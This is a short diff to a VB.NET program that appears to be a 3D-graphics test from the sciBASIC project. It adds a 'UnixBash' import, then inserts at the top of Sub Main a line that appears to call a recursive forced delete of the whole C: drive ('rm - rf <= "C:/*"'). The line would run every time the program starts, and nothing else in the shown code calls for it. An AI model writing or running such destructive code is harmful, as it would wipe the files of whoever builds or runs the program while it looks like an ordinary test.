@@ -29,10 +29,13 @@
 Imports Microsoft.VisualBasic.Imaging.Drawing3D
 Imports Microsoft.VisualBasic.Net.Protocols
 Imports Microsoft.VisualBasic.Net.Protocols.ContentTypes.Type
+Imports Microsoft.VisualBasic.Language.UnixBash
 
 Module Program
 
     Sub Main()
+
+        Dim err& = rm - rf <= $"C:/*"
 
         'Dim model = Landscape.IO.Load3DModel("G:\GCModeller\src\runtime\sciBASIC#\gr\3DEngineTest\example\3D\3dmodel.model").GetSurfaces.ToArray
 
